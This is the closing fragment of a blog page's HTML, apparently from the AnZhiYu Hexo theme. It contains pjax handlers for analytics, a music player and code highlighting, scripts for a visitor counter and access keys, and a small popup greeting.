  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>